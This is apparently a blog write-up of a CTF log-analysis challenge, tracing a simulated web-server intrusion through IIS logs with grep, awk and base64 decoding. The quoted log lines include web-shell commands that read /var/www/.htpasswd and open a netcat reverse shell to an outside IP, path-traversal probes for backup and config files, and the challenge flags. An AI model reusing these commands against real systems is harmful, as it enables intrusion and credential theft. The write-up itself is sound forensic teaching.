---
author: jartigag
categories: ctf
date: 2021-10-09
layout: post
tags: [jartigag, iis logs, access logs, grep, awk]
title: DigitalOverdoseCTF 2021 - Log Analysis [Analysis]
---

# Log Analysis

> An incident has affected our website! Fortunately, we have logs.

This is a 3-part challenge. Two IIS logs are provided:

```bash
$ ll *log
9,4M attack.log
 46M more.log
$ for f in *log; do cat $f | (head -2; tail -1); done
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2021-09-01 00:28:00 135.233.142.30 GET polyfills-es5.9fba121277a252cdf0fa.js - 443 - 83.147.40.142 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+WOW64;+Trident/5.0) - 200 0 0 22
2021-09-06 23:49:22 135.233.142.30 GET conference - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/ctf 200 0 0 20
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2021-08-01 00:27:00 45.85.1.176 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 185.251.117.121 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;+.NET+CLR+1.1.4322) - 200 0 0 24
2021-08-31 23:34:04 45.85.1.176 GET privacy - 443 - 31.185.221.23 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/2021 200 0 0 20
```

## 1 - Ingress

> Our website was hacked recently and the attackers completely ransomwared our server!
> We've recovered it now, but we don't want it to happen again.
> Here are the logs from before the attack, can you find out what happened?

We start inspecting some log fields, looking for something uncommon. For example, in the [`cs(Referer)` field](https://en.wikipedia.org/wiki/HTTP_referer):
```shell
$ awk '{print $(NF-4)}' attack.log | sort | uniq -c | sort -nr
   6947 -
   1343 https://digitaloverdose.tech/dovercon/sponsoring-edition-2021
   1318 https://digitaloverdose.tech/dovercon/2021/speakers
   1286 https://digitaloverdose.tech/dovercon/2021/code-of-conduct
   1278 https://digitaloverdose.tech/dovercon/2021/about
   1268 https://digitaloverdose.tech/dovercon/2021
   1262 https://digitaloverdose.tech/privacy
   1255 https://digitaloverdose.tech/ctf/2021-autumn
   1230 https://digitaloverdose.tech/team
   1225 https://digitaloverdose.tech/faq
   1224 https://digitaloverdose.tech/dovercon/2021/cfp
   1214 https://digitaloverdose.tech/copyright
   1213 https://digitaloverdose.tech/ctf/2021-spring
   1210 https://digitaloverdose.tech/dovercon
   1210 https://digitaloverdose.tech/conference
   1208 https://digitaloverdose.tech/dovercon/2021/sponsoring
   1206 https://digitaloverdose.tech/dovercon/cfp-edition-2021
   1205 https://digitaloverdose.tech/dovercon/team-edition-2021
   1204 https://digitaloverdose.tech/home
   1202 https://digitaloverdose.tech/ctf/about
   1197 https://digitaloverdose.tech/
   1194 https://digitaloverdose.tech/ctf
   1149 https://digitaloverdose.tech/dovercon/schedule-edition-2021
   1149 https://digitaloverdose.tech/dovercon/2021/mentors
   1135 https://digitaloverdose.tech/dovercon/2021/schedule
   1118 https://digitaloverdose.tech/dovercon/2021/team
   1090 https://digitaloverdose.tech/dovercon/speakers-edition-2021
      7 https://digitaloverdose.tech/ywesusnz
      1 cs(Referer)
```

What is that `ywesusnz`? Let's look which requests were made from that URI:
```shell
$ grep ywesusnz attack.log
2021-09-06 20:44:19 135.233.142.30 GET ywesusnz cmd%3Dcd+.. 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/faq 200 0 0 20
2021-09-06 20:44:45 135.233.142.30 GET ywesusnz cmd%3Dpwd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
2021-09-06 20:45:04 135.233.142.30 GET ywesusnz cmd%3Dwhoami 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 25
2021-09-06 20:45:16 135.233.142.30 GET ywesusnz cmd%3Dhostname 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 25
2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
$ echo RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== | base64 -d
DO{better_remove_that_backdoor}
```

## 2 - Investigation

> Thanks for finding the RFI vulnerability in our FAQ.  We have fixed it now, but we don't understand how the attacker found it so quickly.
> We suspect it might be an inside job, but maybe they got the source another way.  Here are the logs for the month prior to the attack, can you see anything suspicious?
> Please submit the attackers IP as the flag as follow, DO{x.x.x.x}

What characters would a suspicious request contain (maybe looking for a [path transversal attack](https://en.wikipedia.org/wiki/Directory_traversal_attack))?

```shell
$ grep "\.\." more.log | (head -3; tail -1)
2021-08-03 08:55:00 45.85.1.176 GET ../..//passwords.bckp - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
2021-08-03 08:55:00 45.85.1.176 GET ..//configuration.3 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 22
2021-08-03 08:55:00 45.85.1.176 GET ../../..//db_config.1 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 25
2021-08-03 08:55:08 45.85.1.176 GET ../..//admin.txt - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 30
```

So we compose the flag with the client IP:

`DO{200.13.84.124}`

## 3 - Backup Policy

> So it looks like the attacker scanned our site for old backups right?  Did he get one?

Filtering the attack date and excluding the "404 - Not found" response code:

```bash
$ grep "2021-08-03 08:55" more.log | grep -v 404
2021-08-03 08:55:00 45.85.1.176 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) - 200 0 0 22
2021-08-03 08:55:00 45.85.1.176 GET dovercon/speakers-edition-2021 - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) - 200 0 0 26
2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
2021-08-03 08:55:29 45.85.1.176 GET runtime-es5.43df09c2199138dc23a5.js - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 22
2021-08-03 08:55:29 45.85.1.176 GET assets/images/ctf/2021-01/offsec-logo.svg - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 27
2021-08-03 08:55:29 45.85.1.176 GET polyfills-es5.9fba121277a252cdf0fa.js - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 20
2021-08-03 08:55:29 45.85.1.176 GET dovercon/speakers-edition-2021 - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 21
2021-08-03 08:55:39 45.85.1.176 GET assets/images/ctf/2021-01/offsec-logo.svg - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 20
2021-08-03 08:55:39 45.85.1.176 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 30
2021-08-03 08:55:39 45.85.1.176 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 25
2021-08-03 08:55:39 45.85.1.176 GET dovercon/schedule-edition-2021 - 443 - 109.70.150.227 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) https://digitaloverdose.tech/dovercon/speakers-edition-2021 200 0 0 25
$ echo "RE97czNjcjN0X19fYWdlbnR9" | base64 -d
DO{s3cr3t___agent}
```
